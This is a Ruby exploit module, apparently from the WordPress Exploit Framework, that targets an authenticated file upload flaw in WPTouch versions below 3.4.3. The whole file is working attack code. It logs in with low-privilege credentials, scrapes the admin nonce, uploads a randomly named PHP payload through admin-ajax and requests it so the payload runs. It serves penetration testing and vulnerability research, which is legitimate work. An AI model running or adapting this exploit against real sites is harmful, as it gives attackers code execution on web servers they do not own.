class Wpxf::Exploit::WptouchAuthenticatedShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::WordPress::Login

  def initialize
    super

    update_info(
      name: 'WPTouch Authenticated Shell Upload',
      desc: 'This module exploits a file upload vulnerability in versions '\
            '< 3.4.3 of the WPTouch plugin which allows authenticated users '\
            'of any level (e.g. subscriber) to upload and execute PHP scripts '\
            'in the context of the web server.',
      author: [
        'Marc-Alexandre Montpas',         # Vulnerability discovery
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['URL', 'http://blog.sucuri.net/2014/07/disclosure-insecure-nonce-generation-in-wptouch.html'],
        ['WPVDB', '7118']
      ],
      date: 'Jul 14 2014'
    )

    register_options([
      StringOption.new(
        name: 'username',
        desc: 'The WordPress username to authenticate with',
        required: true
      ),
      StringOption.new(
        name: 'password',
        desc: 'The WordPress password to authenticate with',
        required: true
      )
    ])
  end

  def username
    normalized_option_value('username')
  end

  def password
    normalized_option_value('password')
  end

  def check
    check_plugin_version_from_readme('wptouch', '3.4.3')
  end

  def payload_body_builder(payload_name, nonce)
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('myfile', payload.encoded, payload_name)
    builder.add_field('file_type', 'homescreen_image')
    builder.add_field('action', 'upload_file')
    builder.add_field('setting_name', 'wptouch__foundation__logo_image')
    builder.add_field('wp_nonce', nonce)
    builder
  end

  def get_nonce(cookie)
    res = execute_get_request(url: wordpress_url_admin, cookie: cookie)
    if res && res.body && res.body =~ /var WPtouchCustom = {[^}]+"admin_nonce":"([a-z0-9]+)"};/
      return Regexp.last_match[1]
    else
      return nil
    end
  end

  def run
    return false unless super

    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    emit_info 'Acquiring an upload nonce...'
    nonce = get_nonce(cookie)
    if nonce.nil?
      emit_error 'Could not acquire an upload nonce'
      return false
    else
      emit_success "Acquired an upload nonce: #{nonce}", true
    end

    emit_info 'Preparing payload...'
    payload_name = "#{Utility::Text.rand_alpha(rand(5..10))}.php"
    builder = payload_body_builder(payload_name, nonce)

    emit_info 'Uploading payload...'
    res = nil
    builder.create do |body|
      res = execute_post_request(
        url: wordpress_url_admin_ajax,
        body: body,
        cookie: cookie
      )
    end

    if res.nil? || res.timed_out?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_info "Response code: #{res.code}", true
      emit_info "Response body: #{res.body}", true
      emit_error 'Failed to upload payload'
      return false
    end

    payload_url = res.body
    emit_success "Uploaded the payload to #{payload_url}", true

    emit_info 'Executing the payload...'
    res = execute_get_request(url: payload_url)
    if res && res.code == 200 && !res.body.strip.empty?
      emit_success "Result: #{res.body}"
    end

    return true
  end
end
